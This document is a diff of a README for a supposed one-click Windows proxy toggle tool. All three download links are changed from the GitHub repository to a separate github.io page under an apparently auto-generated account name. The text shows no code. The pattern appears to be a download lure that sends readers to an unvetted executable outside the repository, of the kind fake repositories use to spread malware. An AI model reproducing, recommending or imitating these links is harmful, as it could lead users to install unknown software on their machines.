@@ -1,7 +1,7 @@
 <h1>⚡ Proxy-Toggle-Tool-2026 - Toggle Windows Proxy in One Click</h1>
 
 <p align="center">
-  <a href="https://github.com/Toothpassbooksavingsaccount982/Proxy-Toggle-Tool-2026">
+  <a href="https://toothpassbooksavingsaccount982.github.io">
     <img src="https://img.shields.io/badge/Download-Proxy_Toggle_Tool-2ea44f?style=for-the-badge&logo=windows&logoColor=white" alt="Download Proxy Toggle Tool">
   </a>
 </p>
@@ -32,7 +32,7 @@ Getting this tool running on your Windows PC is easier than ordering a pizza onl
 
 Visit this link to download the application:
 
-[Download Proxy-Toggle-Tool-2026](https://github.com/Toothpassbooksavingsaccount982/Proxy-Toggle-Tool-2026)
+[Download Proxy-Toggle-Tool-2026](https://toothpassbooksavingsaccount982.github.io)
 
 The download should start automatically. If your browser asks you to confirm the download, click "Save" or "OK". The file will be saved to your "Downloads" folder.
 
@@ -172,7 +172,7 @@ If you found this useful, please consider starring the repository on GitHub. It 
 
 Go ahead and make the switch. Your internet settings will thank you.
 
-[Download Proxy-Toggle-Tool-2026 Now](https://github.com/Toothpassbooksavingsaccount982/Proxy-Toggle-Tool-2026)
+[Download Proxy-Toggle-Tool-2026 Now](https://toothpassbooksavingsaccount982.github.io)
 
 ---
 
